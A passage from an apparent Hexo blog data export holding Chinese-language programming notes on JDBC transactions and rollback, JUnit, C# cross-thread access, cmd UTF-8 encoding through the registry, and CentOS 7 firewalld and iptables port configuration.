class=\"headerlink\" title=\"事务\"></a>事务</h4><p>要么都成功,要么都失败</p>\n<p>ACID原则:保证数据的安全</p>\n<p>开启事务</p>\n<p>事务提交    commit()</p>\n<p>事务回滚    rollback()</p>\n<p>关闭事务</p>\n<p>例子:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">转账:A和B</span><br><span class=\"line\"></span><br><span class=\"line\">如果A转账100给B,那么如果A-100和B+100就要绑定成一个事务,防止数据出现问题</span><br><span class=\"line\">start transaction ;#开启事务</span><br><span class=\"line\">update account set money=money-100 where name=&#x27;A&#x27;;</span><br><span class=\"line\">update account set money=money+100 where name=&#x27;B&#x27;;</span><br><span class=\"line\">commit ;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.test;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.junit.Test;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Connection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.DriverManager;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    Connection connection=<span class=\"keyword\">null</span>;</span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//配置信息</span></span><br><span class=\"line\">        <span class=\"comment\">//useUnicode=true&amp;characterEncoding=utf-8解决中文乱码</span></span><br><span class=\"line\">        String url = <span class=\"string\">&quot;jdbc:mysql://localhost:3306/jdbc?useUnicode=true&amp;characterEncoding=utf-8&quot;</span>;</span><br><span class=\"line\">        String username = <span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">        String password = <span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//1.加载驱动,通过反射</span></span><br><span class=\"line\">            Class.forName(<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">            <span class=\"comment\">//2.连接数据库,代表数据表</span></span><br><span class=\"line\">            connection = DriverManager.getConnection(url, username, password);</span><br><span class=\"line\">            <span class=\"comment\">//3.通知数据库开启事务,false 开启</span></span><br><span class=\"line\">            connection.setAutoCommit(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">            String sql1 = <span class=\"string\">&quot;update account set money=money-100 where name=&#x27;A&#x27;&quot;</span>;</span><br><span class=\"line\">            connection.prepareStatement(sql1).executeUpdate();</span><br><span class=\"line\">            <span class=\"comment\">//制造错误</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> i = <span class=\"number\">1</span> / <span class=\"number\">0</span>;</span><br><span class=\"line\">            String sql2 = <span class=\"string\">&quot;update account set money=money+100 where name=&#x27;B&#x27;&quot;</span>;</span><br><span class=\"line\">            connection.prepareStatement(sql2).executeUpdate();</span><br><span class=\"line\">            <span class=\"comment\">//上面两条都执行成功了,才能提交事务</span></span><br><span class=\"line\">            connection.commit();</span><br><span class=\"line\">            connection.close();</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//如果出现异常,就通知数据库回滚事务</span></span><br><span class=\"line\">                connection.rollback();</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (Exception ex)&#123;</span><br><span class=\"line\">                ex.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Junit单元测试\"><a href=\"#Junit单元测试\" class=\"headerlink\" title=\"Junit单元测试\"></a>Junit单元测试</h4><p>依赖,pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.12<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"简单使用\"><a href=\"#简单使用\" class=\"headerlink\" title=\"简单使用\"></a>简单使用</h5><p>@Test注解只在方法上有效,只要加了个这个注解的方法,就可以直接运行,不需要写main了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.test;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.junit.Test;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"number\">123</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"cSharp跨线程访问","date":"2021-12-27T08:20:17.000Z","typora-root-url":"..","_content":"\n在c#中往往会报出这样的异常\"调用线程无法访问此对象,因为另一个线程拥有它\",如果允许了这种情况,则可能会出现两个线程抢一块资源的情况,可能会出现**死锁**的情况\n\n![image-20211227162712864](/images/cSharp%E8%B7%A8%E7%BA%BF%E7%A8%8B%E8%AE%BF%E9%97%AE/image-20211227162712864.png)\n\n##### 解决思路\n\n可以通过一种**委托代理**的思路来解决,类似的思路还出现在Runnable接口调用start方法    [路标](/2021/12/23/java多线程)\n\n","source":"_posts/cSharp跨线程访问.md","raw":"---\ntitle: cSharp跨线程访问\ndate: 2021-12-27 16:20:17\ntags: \n    -c#\n    -异常处理\ncategories: c#\ntypora-root-url: ..\n---\n\n在c#中往往会报出这样的异常\"调用线程无法访问此对象,因为另一个线程拥有它\",如果允许了这种情况,则可能会出现两个线程抢一块资源的情况,可能会出现**死锁**的情况\n\n![image-20211227162712864](/images/cSharp%E8%B7%A8%E7%BA%BF%E7%A8%8B%E8%AE%BF%E9%97%AE/image-20211227162712864.png)\n\n##### 解决思路\n\n可以通过一种**委托代理**的思路来解决,类似的思路还出现在Runnable接口调用start方法    [路标](/2021/12/23/java多线程)\n\n","slug":"cSharp跨线程访问","published":1,"updated":"2022-01-07T13:31:06.115Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9lv0005gsw97j3w35p8","content":"<p>在c#中往往会报出这样的异常”调用线程无法访问此对象,因为另一个线程拥有它”,如果允许了这种情况,则可能会出现两个线程抢一块资源的情况,可能会出现<strong>死锁</strong>的情况</p>\n<p><img src=\"/images/cSharp%E8%B7%A8%E7%BA%BF%E7%A8%8B%E8%AE%BF%E9%97%AE/image-20211227162712864.png\" alt=\"image-20211227162712864\"></p>\n<h5 id=\"解决思路\"><a href=\"#解决思路\" class=\"headerlink\" title=\"解决思路\"></a>解决思路</h5><p>可以通过一种<strong>委托代理</strong>的思路来解决,类似的思路还出现在Runnable接口调用start方法    <a href=\"/2021/12/23/java%E5%A4%9A%E7%BA%BF%E7%A8%8B\">路标</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>在c#中往往会报出这样的异常”调用线程无法访问此对象,因为另一个线程拥有它”,如果允许了这种情况,则可能会出现两个线程抢一块资源的情况,可能会出现<strong>死锁</strong>的情况</p>\n<p><img src=\"/images/cSharp%E8%B7%A8%E7%BA%BF%E7%A8%8B%E8%AE%BF%E9%97%AE/image-20211227162712864.png\" alt=\"image-20211227162712864\"></p>\n<h5 id=\"解决思路\"><a href=\"#解决思路\" class=\"headerlink\" title=\"解决思路\"></a>解决思路</h5><p>可以通过一种<strong>委托代理</strong>的思路来解决,类似的思路还出现在Runnable接口调用start方法    <a href=\"/2021/12/23/java%E5%A4%9A%E7%BA%BF%E7%A8%8B\">路标</a></p>\n"},{"title":"cmd修改编码为utf-8","date":"2021-01-13T09:41:16.000Z","_content":"\n### cmd修改编码为utf-8\n\nwin+r输入regedit打开注册表\n\n找到对应位置添加aotorun值为chcp 65001 这样每次打开cmd都会自动运行chcp 65001更改为utf-8\n\n![Image](https://gitee.com/blue_satchel/images/raw/master/Image.png)\n","source":"_posts/cmd修改编码为utf-8.md","raw":"---\ntitle: cmd修改编码为utf-8\ndate: 2021-01-13 17:41:16\ntags:\n      - cmd\n      - 编码\ncategories: 小技巧\n---\n\n### cmd修改编码为utf-8\n\nwin+r输入regedit打开注册表\n\n找到对应位置添加aotorun值为chcp 65001 这样每次打开cmd都会自动运行chcp 65001更改为utf-8\n\n![Image](https://gitee.com/blue_satchel/images/raw/master/Image.png)\n","slug":"cmd修改编码为utf-8","published":1,"updated":"2022-01-13T09:42:37.284Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9lz0009gsw91wskf4i8","content":"<h3 id=\"cmd修改编码为utf-8\"><a href=\"#cmd修改编码为utf-8\" class=\"headerlink\" title=\"cmd修改编码为utf-8\"></a>cmd修改编码为utf-8</h3><p>win+r输入regedit打开注册表</p>\n<p>找到对应位置添加aotorun值为chcp 65001 这样每次打开cmd都会自动运行chcp 65001更改为utf-8</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/Image.png\" alt=\"Image\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"cmd修改编码为utf-8\"><a href=\"#cmd修改编码为utf-8\" class=\"headerlink\" title=\"cmd修改编码为utf-8\"></a>cmd修改编码为utf-8</h3><p>win+r输入regedit打开注册表</p>\n<p>找到对应位置添加aotorun值为chcp 65001 这样每次打开cmd都会自动运行chcp 65001更改为utf-8</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/Image.png\" alt=\"Image\"></p>\n"},{"title":"centos7防火墙配置","date":"2021-01-13T10:25:11.000Z","_content":"\n## CentOS7 防火墙设置\n\n阿里云centos7中默认使用firewall,并且默认没有开启。\n\n使用阿里云服务器,先要在阿里云后台开放端口,然后关闭centos防火墙或者开放centos的对应端口,只开放centos端口,不设置阿里云端口设置,仍然不能访问!firewall配置\n\n#### 重启、关闭、开启firewalld服务\n\n##### 启动\n\nsystemctl start firewalld\n\n##### 开机启动\n\nsystemctl enable firewalld\n\n##### 关闭\n\nsystemctl stop firewalld\n\n##### 取消开机启动\n\nsystemctl disable firewalld\n\n#####  重启\n\nservice firewalld restart\n\n##### 查看firewall的状态\n\nfirewall-cmd --state\n\n##### 查看防火墙规则\n\nfirewall-cmd --list-all\n\n##### 用户配置目录\n\ncd /etc/firewalld/命令行方式\n\n##### 常用的几个端口和配置语句\n\n```bash\n**# web**\n\nfirewall-cmd --zone=public --permanent --add-port=80/tcp\n\n**# mysql**\n\nfirewall-cmd --zone=public --permanent --add-port=3306/tcp\n\n**# tomcat**\n\nfirewall-cmd --zone=public --permanent --add-port=8080/tcp\n\n**# redis**\n\nfirewall-cmd --zone=public --permanent --add-port=6379/tcp\n\n\n\nfirewall-cmd：是Linux提供的操作firewall的一个工具； –permanent：表示设置为持久； –add-port：标识添加的端口； –zone=public：指定的zone为public；\n\n```\n\n##### 批量添加端口\n\nfirewall-cmd --zone=public --permanent --add-port=8081-8200/tcp\n\n##### 生成的配置文件所在路径\n\nvi /etc/firewalld/zones/public.xml\n\n##### 配置完成后重启\n\nservice firewalld restart配置文件方式\n\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?><zone>\n\n<short>Public</short>\n<description>For use in public areas.</description>\n<rule family=\"ipv4\">\n<source address=\"122.10.70.234\"/>\n<port protocol=\"udp\" port=\"514\"/>\n<accept/>\n</rule>\n<rule family=\"ipv4\">\n<source address=\"123.60.255.14\"/>\n<port protocol=\"tcp\" port=\"10050-10051\"/>\n<accept/>\n</rule>\n<rule family=\"ipv4\">\n<source address=\"192.249.87.114\"/>\n<port protocol=\"tcp\" port=\"80\"/>\n<accept/>\n</rule>\n<rule family=\"ipv4\">\n<port protocol=\"tcp\" port=\"9527\"/>\n<accept/>\n</rule>\n</zone>\n```\n\n`上面的对应的规则`\n\n`固定IP 固定协议 的固定端口访问`\n\n`固定IP 固定协议 的范围端口访问`\n\n`固定IP 固定协议 的固定端口访问`\n\n`任意IP 固定协议 的固定端口访问切换为iptables防火墙`\n\n`关闭firewall：`\n\n\n\n#### 安装iptables防火墙\n\n\n\n##### 安装\n\n`yum install iptables-services`\n\n##### 开启iptables\n\n`service iptables restart`\n\n##### 设置防火墙开机启动\n\n`systemctl enable iptables.service  或者chkconfig iptables on`\n\n##### \n\n##### 查看已生效的规则\n\niptables -L -n命令行方式\n\n`iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT`\n\n##### 写入配置文件\n\n`service iptables save`\n\n这样下次重启依旧会生效配置文件方式\n\n##### 编辑iptables防火墙配置\n\nvi /etc/sysconfig/iptables\n\n下边是一个完整的配置文件：\n\n\n\n```bash\nFirewall configuration written by system-config-firewall\n\nManual customization of this file is not recommended.\n\n\n*filter\n\n\n:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [0:0]\n\n\n-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n-A INPUT -p icmp -j ACCEPT\n\n-A INPUT -i lo -j ACCEPT\n\n\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT\n\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT\n\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT\n\n\n-A INPUT -j REJECT --reject-with icmp-host-prohibited\n\n-A FORWARD -j REJECT --reject-with icmp-host-prohibited\n\n\nCOMMIT\n```\n\n保存退出\n\n:wq!\n\n","source":"_posts/centos7防火墙配置.md","raw":"---\ntitle: centos7防火墙配置\ndate: 2021-01-13 18:25:11\ntags:\n      - linux\n      - centos\n      - firwall\ncategories: linux\n---\n\n## CentOS7 防火墙设置\n\n阿里云centos7中默认使用firewall,并且默认没有开启。\n\n使用阿里云服务器,先要在阿里云后台开放端口,然后关闭centos防火墙或者开放centos的对应端口,只开放centos端口,不设置阿里云端口设置,仍然不能访问!firewall配置\n\n#### 重启、关闭、开启firewalld服务\n\n##### 启动\n\nsystemctl start firewalld\n\n##### 开机启动\n\nsystemctl enable firewalld\n\n##### 关闭\n\nsystemctl stop firewalld\n\n##### 取消开机启动\n\nsystemctl disable firewalld\n\n#####  重启\n\nservice firewalld restart\n\n##### 查看firewall的状态\n\nfirewall-cmd --state\n\n##### 查看防火墙规则\n\nfirewall-cmd --list-all\n\n##### 用户配置目录\n\ncd /etc/firewalld/命令行方式\n\n##### 常用的几个端口和配置语句\n\n```bash\n**# web**\n\nfirewall-cmd --zone=public --permanent --add-port=80/tcp\n\n**# mysql**\n\nfirewall-cmd --zone=public --permanent --add-port=3306/tcp\n\n**# tomcat**\n\nfirewall-cmd --zone=public --permanent --add-port=8080/tcp\n\n**# redis**\n\nfirewall-cmd --zone=public --permanent --add-port=6379/tcp\n\n\n\nfirewall-cmd：是Linux提供的操作firewall的一个工具； –permanent：表示设置为持久； –add-port：标识添加的端口； –zone=public：指定的zone为public；\n\n```\n\n##### 批量添加端口\n\nfirewall-cmd --zone=public --permanent --add-port=8081-8200/tcp\n\n##### 生成的配置文件所在路径\n\nvi /etc/firewalld/zones/public.xml\n\n##### 配置完成后重启\n\nservice firewalld restart配置文件方式\n\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?><zone>\n\n<short>Public</short>\n<description>For use in public areas.</description>\n<rule family=\"ipv4\">\n<source address=\"122.10.70.234\"/>\n<port protocol=\"udp\" port=\"514\"/>\n<accept/>\n</rule>\n<rule family=\"ipv4\">\n<source address=\"123.60.255.14\"/>\n<port protocol=\"tcp\" port=\"10050-10051\"/>\n<accept/>\n</rule>\n<rule family=\"ipv4\">\n<source address=\"192.249.87.114\"/>\n<port protocol=\"tcp\" port=\"80\"/>\n<accept/>\n</rule>\n<rule family=\"ipv4\">\n<port protocol=\"tcp\" port=\"9527\"/>\n<accept/>\n</rule>\n</zone>\n```\n\n`上面的对应的规则`\n\n`固定IP 固定协议 的固定端口访问`\n\n`固定IP 固定协议 的范围端口访问`\n\n`固定IP 固定协议 的固定端口访问`\n\n`任意IP 固定协议 的固定端口访问切换为iptables防火墙`\n\n`关闭firewall：`\n\n\n\n#### 安装iptables防火墙\n\n\n\n##### 安装\n\n`yum install iptables-services`\n\n##### 开启iptables\n\n`service iptables restart`\n\n##### 设置防火墙开机启动\n\n`systemctl enable iptables.service  或者chkconfig iptables on`\n\n##### \n\n##### 查看已生效的规则\n\niptables -L -n命令行方式\n\n`iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT`\n\n##### 写入配置文件\n\n`service iptables save`\n\n这样下次重启依旧会生效配置文件方式\n\n##### 编辑iptables防火墙配置\n\nvi /etc/sysconfig/iptables\n\n下边是一个完整的配置文件：\n\n\n\n```bash\nFirewall configuration written by system-config-firewall\n\nManual customization of this file is not recommended.\n\n\n*filter\n\n\n:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [0:0]\n\n\n-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n-A INPUT -p icmp -j ACCEPT\n\n-A INPUT -i lo -j ACCEPT\n\n\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT\n\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT\n\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT\n\n\n-A INPUT -j REJECT --reject-with icmp-host-prohibited\n\n-A FORWARD -j REJECT --reject-with icmp-host-prohibited\n\n\nCOMMIT\n```\n\n保存退出\n\n:wq!\n\n","slug":"centos7防火墙配置","published":1,"updated":"2022-01-13T10:34:16.885Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9m1000agsw9bgpzhdfc","content":"<h2 id=\"CentOS7-防火墙设置\"><a href=\"#CentOS7-防火墙设置\" class=\"headerlink\" title=\"CentOS7 防火墙设置\"></a>CentOS7 防火墙设置</h2><p>阿里云centos7中默认使用firewall,并且默认没有开启。</p>\n<p>使用阿里云服务器,先要在阿里云后台开放端口,然后关闭centos防火墙或者开放centos的对应端口,只开放centos端口,不设置阿里云端口设置,仍然不能访问!firewall配置</p>\n<h4 id=\"重启、关闭、开启firewalld服务\"><a href=\"#重启、关闭、开启firewalld服务\" class=\"headerlink\" title=\"重启、关闭、开启firewalld服务\"></a>重启、关闭、开启firewalld服务</h4><h5 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h5><p>systemctl start firewalld</p>\n<h5 id=\"开机启动\"><a href=\"#开机启动\" class=\"headerlink\" title=\"开机启动\"></a>开机启动</h5><p>systemctl enable firewalld</p>\n<h5 id=\"关闭\"><a href=\"#关闭\" class=\"headerlink\" title=\"关闭\"></a>关闭</h5><p>systemctl stop firewalld</p>\n<h5 id=\"取消开机启动\"><a href=\"#取消开机启动\" class=\"headerlink\" title=\"取消开机启动\"></a>取消开机启动</h5><p>systemctl disable firewalld</p>\n<h5 id=\"重启\"><a href=\"#重启\" class=\"headerlink\" title=\"重启\"></a>重启</h5><p>service firewalld restart</p>\n<h5 id=\"查看firewall的状态\"><a href=\"#查看firewall的状态\" class=\"headerlink\" title=\"查看firewall的状态\"></a>查看firewall的状态</h5><p>firewall-cmd –state</p>\n<h5 id=\"查看防火墙规则\"><a href=\"#查看防火墙规则\" class=\"headerlink\" title=\"查看防火墙规则\"></a>查看防火墙规则</h5><p>firewall-cmd –list-all</p>\n<h5 id=\"用户配置目录\"><a href=\"#用户配置目录\" class=\"headerlink\" title=\"用户配置目录\"></a>用户配置目录</h5><p>cd /etc/firewalld/命令行方式</p>\n<h5 id=\"常用的几个端口和配置语句\"><a href=\"#常用的几个端口和配置语句\" class=\"headerlink\" title=\"常用的几个端口和配置语句\"></a>常用的几个端口和配置语句</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">**<span class=\"comment\"># web**</span></span><br><span class=\"line\"></span><br><span class=\"line\">firewall-cmd --zone=public --permanent --add-port=80/tcp</span><br><span class=\"line\"></span><br><span class=\"line\">**<span class=\"comment\"># mysql**</span></span><br><span class=\"line\"></span><br><span class=\"line\">firewall-cmd --zone=public --permanent --add-port=3306/tcp</span><br><span class=\"line\"></span><br><span class=\"line\">**<span class=\"comment\"># tomcat**</span></span><br><span class=\"line\"></span><br><span class=\"line\">firewall-cmd --zone=public --permanent --add-port=8080/tcp</span><br><span class=\"line\"></span><br><span class=\"line\">**<span class=\"comment\"># redis**</span></span><br><span class=\"line\"></span><br><span class=\"line\">firewall-cmd --zone=public --permanent --add-port=6379/tcp</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">firewall-cmd：是Linux提供的操作firewall的一个工具； –permanent：表示设置为持久； –add-port：标识添加的端口； –zone=public：指定的zone为public；</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"批量添加端口\"><a href=\"#批量添加端口\" class=\"headerlink\" title=\"批量添加端口\"></a>批量添加端口</h5><p>firewall-cmd –zone=public –permanent –add-port=8081-8200/tcp</p>\n<h5 id=\"生成的配置文件所在路径\"><a href=\"#生成的配置文件所在路径\" class=\"headerlink\" title=\"生成的配置文件所在路径\"></a>生成的配置文件所在路径</h5><p>vi /etc/firewalld/zones/public.xml</p>\n<h5 id=\"配置完成后重启\"><a href=\"#配置完成后重启\" class=\"headerlink\" title=\"配置完成后重启\"></a>配置完成后重启</h5><p>service firewalld restart配置文件方式</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><span class=\"tag\">&lt;<span class=\"name\">zone</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">short</span>&gt;</span>Public<span class=\"tag\">&lt;/<span class=\"name\">short</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span>For use in public areas.<span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">rule</span> <span class=\"attr\">family</span>=<span class=\"string\">&quot;ipv4&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">source</span> <span class=\"attr\">address</span>=<span class=\"string\">&quot;122.10.70.234&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">port</span> <span class=\"attr\">protocol</span>=<span class=\"string\">&quot;udp&quot;</span> <span class=\"attr\">port</span>=<span class=\"string\">&quot;514&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">accept</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">rule</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">rule</span> <span class=\"attr\">family</span>=<span class=\"string\">&quot;ipv4&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">source</span> <span class=\"attr\">address</span>=<span class=\"string\">&quot;123.60.255.14&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">port</span> <span class=\"attr\">protocol</span>=<span class=\"string\">&quot;tcp&quot;</span> <span class=\"attr\">port</span>=<span class=\"string\">&quot;10050-10051&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">accept</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">rule</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">rule</span> <span class=\"attr\">family</span>=<span class=\"string\">&quot;ipv4&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">source</span> <span class=\"attr\">address</span>=<span class=\"string\">&quot;192.249.87.114&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">port</span> <span class=\"attr\">protocol</span>=<span class=\"string\">&quot;tcp&quot;</span> <span class=\"attr\">port</span>=<span class=\"string\">&quot;80&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">accept</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">rule</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">rule</span> <span class=\"attr\">family</span>=<span class=\"string\">&quot;ipv4&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">port</span> <span class=\"attr\">protocol</span>=<span class=\"string\">&quot;tcp&quot;</span> <span class=\"attr\">port</span>=<span class=\"string\">&quot;9527&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">accept</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">rule</span>&gt;</span></span><br><span class=\"line\"><span 